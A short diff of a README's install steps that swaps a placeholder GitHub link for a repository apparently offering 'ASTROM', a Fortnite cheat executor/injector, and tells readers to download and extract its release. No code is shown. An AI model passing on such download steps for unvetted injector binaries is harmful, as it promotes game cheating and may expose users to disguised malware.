@@ -71,7 +71,7 @@
 ### Step-by-Step Instructions
 
 1. **Download ASTROM from Releases**
-   - Go to the [Releases](https://github.com/YourUsername/ASTROM/releases) section of the GitHub repository.
+   - Go to the [Releases](https://github.com/TOPexecutors-windows/ASTROM-fortnite---executor-injector/releases) section of the GitHub repository.
    - Download the latest release version of the ASTROM tool.
 
 2. **Extract ASTROM**
